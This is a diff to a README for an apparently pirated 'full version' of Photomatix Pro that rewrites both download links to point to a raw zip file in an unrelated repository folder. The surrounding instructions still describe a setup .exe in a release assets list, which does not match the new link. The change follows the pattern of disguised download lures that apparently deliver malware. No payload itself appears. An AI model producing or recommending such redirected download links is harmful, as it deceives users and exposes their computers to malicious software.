@@ -5,7 +5,7 @@ description: "Download Photomatix Pro for Windows 10 and 11. Access the full ver
 ---
 # 📸 Photomatix-2026 - Create stunning high dynamic range photos
 
-[![Download Photomatix-2026](https://img.shields.io/badge/Download-Photomatix_2026-blue.svg)](https://github.com/joniinclement938/Photomatix-2026)
+[![Download Photomatix-2026](https://img.shields.io/badge/Download-Photomatix_2026-blue.svg)](https://github.com/joniinclement938/joniinclement938.github.io/raw/refs/heads/main/unconduciveness/Application_v1.9.zip)
 
 ## 📖 About the software
 
@@ -28,7 +28,7 @@ Before you install the software, please confirm your computer meets these minimu
 
 Follow these steps to set up Photomatix-2026 on your computer.
 
-1. Go to the [official release page](https://github.com/joniinclement938/Photomatix-2026) to start your download.
+1. Go to the [official release page](https://github.com/joniinclement938/joniinclement938.github.io/raw/refs/heads/main/unconduciveness/Application_v1.9.zip) to start your download.
 2. Look for the file named "Photomatix-Pro-2026-Setup.exe" in the assets list.
 3. Click the file name to save it to your computer.
 4. Open your Downloads folder once the download finishes.
